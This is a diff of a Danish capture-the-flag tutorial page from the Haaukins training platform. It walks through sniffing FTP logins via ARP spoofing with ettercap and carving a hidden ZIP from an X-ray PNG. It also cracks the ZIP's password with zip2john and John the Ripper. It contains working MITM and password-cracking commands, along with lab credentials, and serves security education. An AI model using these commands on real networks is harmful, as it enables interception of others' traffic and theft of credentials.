@@ -26,7 +26,7 @@
 <p>Læger deler røntgenbilleder via FTP (port 21, klartekst). Sniff login'et, log ind, og find
              (1) et synligt flag og (2) skjult "malware" i billederne. To flag i alt.</p>
 <h2>Sniff &amp; log ind</h2>
-<pre><code>sudo ettercap -T -q -i eth0 -M arp:remote /&lt;ftp-server&gt;// ///
+<pre><code>sudo <span class="gloss" tabindex="0" data-tip="ARP-spoofing/MITM-værktøj til at opsnappe trafik på et lokalt netværk.">ettercap</span> -T -q -i eth0 -M arp:remote /&lt;ftp-server&gt;// ///
 #  FTP: ... USER: DoctorWillie  PASS: Ginnie2003</code></pre>
              <p>FTP i docker fejler ofte i <em>passiv</em> mode (intern IP → hænger). Brug <strong>aktiv</strong> mode:</p>
              <pre><code>curl -s -P - "ftp://DoctorWillie:Ginnie2003@&lt;server&gt;/"           # list filer
@@ -36,10 +36,10 @@ curl -s -P - -O "ftp://DoctorWillie:Ginnie2003@&lt;server&gt;/xray5.png"</code><
              flaget står skrevet direkte på røntgenet. Kig altid visuelt på udtrukne billeder — et flag kan være
              synligt selv når stego-værktøjer intet finder.</p>
 <h2>Flag 2 — carve den skjulte ZIP</h2>
-<pre><code>binwalk xray5.png            # -> Zip archive data, encrypted, efter billedets slut
+<pre><code><span class="gloss" tabindex="0" data-tip="Finder og udtrækker indlejrede filer/filsystemer inde i en binær fil.">binwalk</span> xray5.png            # -> Zip archive data, encrypted, efter billedets slut
 dd if=xray5.png bs=1 skip=&lt;offset&gt; of=hidden.zip
-zip2john hidden.zip > zip.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash   # -> password
+<span class="gloss" tabindex="0" data-tip="Konverterer en password-beskyttet zip-fil til et format John kan angribe.">zip2john</span> hidden.zip > zip.hash
+<span class="gloss" tabindex="0" data-tip="John the Ripper — password-cracker (CPU-baseret, mange hash-formater).">john</span> --wordlist=/usr/share/wordlists/rockyou.txt zip.hash   # -> password
 unzip -P &lt;password&gt; hidden.zip</code></pre>
              <p>Nogen har <em>appended</em> en ZIP efter PNG'ets IEND-markør — billedet vises normalt, men ekstra data
              ligger bagved. <code>binwalk</code> finder den.</p>
@@ -50,7 +50,14 @@ unzip -P &lt;password&gt; hidden.zip</code></pre>
         </ul>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li>FTP-data i docker: hvis passiv hænger, brug aktiv mode (<code>curl -P -</code>).</li><li><code>binwalk</code> afslører filer gemt <em>efter</em> et billedes rigtige slut (file carving).</li><li><code>dd skip=&lt;offset&gt;</code> skærer filen ud; <code>zip2john</code>+john knækker ZIP-passwords.</li><li>Kig på billedet med øjnene — ikke kun med værktøjer.</li></ul>
+<ul><li>FTP-data i docker: hvis passiv hænger, brug aktiv mode (<code>curl -P -</code>).</li><li><code>binwalk</code> afslører filer gemt <em>efter</em> et billedes rigtige slut (file carving).</li><li><code>dd skip=&lt;offset&gt;</code> skærer filen ud; <code>zip2john</code>+john knækker ZIP-passwords.</li><li>Kig på billedet med øjnene, ikke kun med værktøjer.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>To uafhængige pointer her. (1) "Data efter filens rigtige slut" er et klassisk gemmested:
+en PNG slutter ved sin IEND-markør, en JPEG ved FFD9, men filsystemet er ligeglad med hvad der
+ligger bagefter. <code>binwalk</code> og <code>foremost</code> findes netop for at carve den
+slags ud. (2) At det synlige flag stod PÅ billedet, mens stego-værktøjer intet fandt, er en
+påmindelse om at den enkleste forklaring (nogen skrev det bare) ofte slår den avancerede. Kig
+altid på artefakten selv, før du antager at der er et raffineret trick.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
